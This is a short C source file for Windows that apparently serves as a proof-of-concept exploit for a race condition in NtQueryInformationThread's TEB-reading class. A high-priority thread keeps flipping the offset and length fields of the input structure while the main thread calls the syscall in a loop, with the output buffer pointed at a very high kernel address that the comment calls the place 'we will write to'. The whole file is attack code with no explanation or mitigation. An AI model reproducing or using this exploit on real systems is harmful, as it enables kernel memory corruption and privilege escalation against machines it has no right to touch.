#include <Windows.h>

// from https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h
typedef struct _THREAD_TEB_INFORMATION
{
    PVOID TebInformation; // buffer to place data in
    ULONG TebOffset; // offset in TEB to begin reading from
    ULONG BytesToRead; // number of bytes to read
} THREAD_TEB_INFORMATION, * PTHREAD_TEB_INFORMATION;

#define ThreadTebInformation 0x1A

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryInformationThread(
    _In_ HANDLE ThreadHandle,
    _In_ ULONG ThreadInformationClass,
    _Out_writes_bytes_(ThreadInformationLength) PVOID ThreadInformation,
    _In_ ULONG ThreadInformationLength,
    _Out_opt_ PULONG ReturnLength
);

// variables for racing
volatile UINT64* smash_me = 0;
BOOL ready_to_smash = 0;

// racing thread
DWORD smash_func(LPVOID unused)
{
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    while (ready_to_smash == 0) {

    }
    while (1) {
        *smash_me ^= 0x0000000100001860; // constantly flip TebOffset and BytesToRead
    }

    return 0;
}

int main(int argc, char** argv)
{
    // bring up the racing thread
    CreateThread(NULL, 0, smash_func, NULL, 0, NULL);

    // set up start for the call
    ULONG return_len = 0;
    HANDLE thread_handle = GetCurrentThread();
    THREAD_TEB_INFORMATION teb_information = { 0 };
    teb_information.TebInformation = MAXUINT64 - 0xFF; // some very high kernel address - this is where we will write to
    teb_information.TebOffset = 0x1860; // some offset within the teb
    teb_information.BytesToRead = 1; // read 1 byte

    // time to race!
    smash_me = &teb_information.TebOffset;
    ready_to_smash = 1;

    while (1) {
        NtQueryInformationThread(thread_handle, ThreadTebInformation, &teb_information, sizeof(THREAD_TEB_INFORMATION), &return_len);
    }
}